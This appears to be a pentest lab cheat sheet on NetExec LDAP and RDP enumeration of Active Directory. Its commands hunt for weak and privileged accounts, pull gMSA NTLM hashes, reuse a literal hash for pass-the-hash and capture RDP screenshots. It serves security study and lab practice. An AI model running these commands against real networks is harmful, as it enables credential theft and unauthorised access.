# 06.10 LDAP RDP Enumeration

> Use NetExec LDAP to enumerate `PASSWD_NOTREQD`, unconstrained-delegation, and adminCount=1 accounts; RDP module screenshots NLA-disabled hosts.

## Overview

LDAP protocol provides additional AD enumeration beyond SMB: users with no password required (`PASSWD_NOTREQD`), unconstrained delegation accounts, adminCount=1 privileged objects, domain SID, and gMSA password retrieval. RDP protocol enables NLA-disabled login screenshots and authenticated desktop screenshots. LDAP requires FQDN target.

## Steps

- `--users --groups` enumerates both users and groups in one LDAP query.
- `--password-not-required` finds accounts exempt from password policy (may have blank passwords).
- `--trusted-for-delegation` finds computers/users configured for unconstrained Kerberos delegation.
- `--admin-count` finds objects with adminCount=1 (protected by SDProp — usually privileged accounts).
- `--get-sid` retrieves the domain SID (needed for certain attacks like Golden Ticket).
- `--gmsa` retrieves gMSA NTLM hashes; only works if the authenticated user has PrincipalsAllowedToRetrieveManagedPassword rights.
- Use the gMSA hash with `-H <NTLM>` for pass-the-hash against any protocol.
- RDP `--nla-screenshot` captures login prompt when NLA is disabled; `--screenshot` captures desktop after login.

## Commands

### LDAP users and groups

```bash
nxc ldap dc01.<DOMAIN>.htb -u robert -p <PASS> --users --groups
```

### Accounts with PASSWD_NOTREQD

```bash
nxc ldap dc01.<DOMAIN>.htb -u robert -p <PASS> --password-not-required
```

### Unconstrained delegation accounts

```bash
nxc ldap dc01.<DOMAIN>.htb -u robert -p <PASS> --trusted-for-delegation
```

### AdminCount=1 objects

```bash
nxc ldap dc01.<DOMAIN>.htb -u robert -p <PASS> --admin-count
```

### Get domain SID

```bash
nxc ldap dc01.<DOMAIN>.htb -u robert -p <PASS> --get-sid
```

### Enumerate gMSA principals

```bash
nxc winrm dc01.<DOMAIN>.htb -u robert -p <PASS> -X "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword"
```

### Retrieve gMSA NTLM hash

```bash
nxc ldap dc01.<DOMAIN>.htb -u engels -p <PASS> --gmsa
```

### Use gMSA hash for SMB

```bash
nxc smb dc01.<DOMAIN>.htb -u svc_inlaneadm$ -H 76fa2df9e8f656ae81b0bd271bef0346 --shares
```

### RDP NLA screenshot (no creds)

```bash
nxc rdp <TARGET> --nla-screenshot
```

### RDP authenticated screenshot

```bash
nxc rdp <TARGET> -u julio -p Password1 --screenshot --screentime 5 --res 1280x720
```
